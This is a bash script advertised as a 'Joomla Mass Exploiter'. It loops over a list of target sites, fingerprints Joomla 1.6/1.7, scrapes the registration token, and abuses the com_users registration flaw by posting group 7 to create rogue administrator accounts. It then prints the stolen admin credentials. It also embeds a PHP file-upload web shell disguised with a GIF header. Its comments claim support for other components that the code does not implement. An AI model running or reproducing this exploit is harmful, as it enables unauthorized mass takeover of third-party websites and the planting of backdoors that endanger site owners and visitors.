#!/bin/bash
# Joomla Mass Exploiter V.1
# http://blog.zerobyte.id/
# usage: ./joomla_mass_exploiter.sh sitelist.txt
# Available for Joomla:
# Com_Fabrik - Com_Foxcontact - Com_Users
# Thanks to: DayWalker ~ Juzo ~ fqx404

## EDIT HERE ##
shell_log="webshell.txt";
email="zombieroot13@gmail.com";
username="schopath";
password="123456";
## EOF ##


shell='GIF89a;'$(echo -ne '\n\r\n')'<title>ZeroByte.ID</title>'$(echo -ne '\n\r\n')'<pre><b>ZeroByte.ID Uploader</b></pre>'$(echo -ne '\n\r\n')'<?php $files = @$_FILES["files"];if ($files["name"] != "") {$fullpath = $_REQUEST["path"] . $files["name"];if (move_uploaded_file($files["tmp_name"], $fullpath)){echo "<a href=\"$fullpath\">Done! click here.</a>";}}?><form method=POST enctype="multipart/form-data" action="">'$(echo -ne '\n\r\n')'<input type=text name=path><input type="file" name="files">'$(echo -ne '\n\r\n')'<br><input type=submit value="Upload">'$(echo -ne '\n\r\n')'</form>';

function comusers(){
	victim=$1;
	if [[ $(timeout 5 curl -s $victim'/administrator/') =~ 'Joomla! 1.7 - Open Source Content Management' ]] || [[ $(timeout 5 curl -s $victim'/index.php') =~ 'Joomla! 1.7 - Open Source Content Management' ]]; then
		echo -ne '';
	elif [[ $(timeout 5 curl -s $victim'/administrator/') =~ 'Joomla! 1.6 - Open Source Content Management' ]] || [[ $(timeout 5 curl -s $victim'/index.php') =~ 'Joomla! 1.6 - Open Source Content Management' ]]; then
		echo -ne '';
	else
		echo '[BAD] Com_Users Not Vulnerable.'
		return 1;
	fi

	# GET HIDDEN VALUE
	timeout 10 curl -s --cookie-jar cookie_com_users.tmp $victim"/index.php?option=com_users&view=registration" | grep -A 2 '<input type="hidden" name="task" value="registration.register"' | grep '" value="1"' | sed 's|" value="1"|\n|g' | head -1 | sed 's|<input type="hidden" name="|\ntoked: |g' | grep 'toked:' | awk '{print $2}' > token_com_users.txt;
	token=$(cat token_com_users.txt);
	if [[ -z $token ]];then
		echo '[BAD] Com_Users cannot get token.'
		return 1
	else
		echo -ne '';
	fi
	timeout 10 curl -s -L -b cookie_com_users.tmp -d "jform[name]=ZerobyteID Exploiter" -d "jform[username]="$username -d "jform[password1]=12345678" -d "jform[password2]=kkk0ntol" -d "jform[email1]="$email -d "jform[email2]="$email -d "jform[groups][]=7" -d "option=com_users" -d "task=registration.register" -d $(cat token_com_users.txt)"=1" $victim"/index.php?option=com_users&view=registration" > 1.txt;
	if [[ $(cat 1.txt) =~ $email ]];then
		echo -ne '';
	else
		echo '[BAD] Com_Users cannot find web-form.';
		return 1
	fi
	timeout 10 curl -s -L -b cookie_com_users.tmp -d "jform[name]=ZerobyteID Exploiter" -d "jform[username]="$username -d "jform[password1]="$password -d "jform[password2]="$password -d "jform[email1]="$email -d "jform[email2]="$email -d "option=com_users" -d "task=registration.register" -d $(cat token_com_users.txt)"=1" $victim"/index.php?option=com_users&view=registration" > 2.txt;
	if [[ $(cat 2.txt) =~ 'jform[password1]' ]];then
		echo '[BAD] Com_Users failed exploitation.'
	else
		echo '[OK] Com_Users Exploited with ['$username':'$password'], open your email for verification.';
		echo $victim'/administrator/ (user: '$username' | password: '$password')';
		return 1
	fi
}

cat << "CREDIT"
 _____              _           _         _     _ 
|__  /___ _ __ ___ | |__  _   _| |_ ___  (_) __| |
  / // _ \ '__/ _ \| '_ \| | | | __/ _ \ | |/ _` |
 / /|  __/ | | (_) | |_) | |_| | ||  __/_| | (_| |
/____\___|_|  \___/|_.__/ \__, |\__\___(_)_|\__,_|
                          |___/                   
----------- Schopath [at] Zerobyte.id -----------
----------- Joomla Mass Exploiter V.1 -----------
-------------------------------------------------

CREDIT

list=$1;
echo 'Total sites: ['$(cat $list | wc -l)']';

for target in $(cat $list); do
	echo '' > cookie_com_users.tmp;echo '' > 1.txt;echo '' > 2.txt;
	echo '[+] Try: '$target;
	comusers $target
	echo '';
	rm -f cookie_com_users.tmp
	rm -f 1.txt
	rm -f 2.txt
done
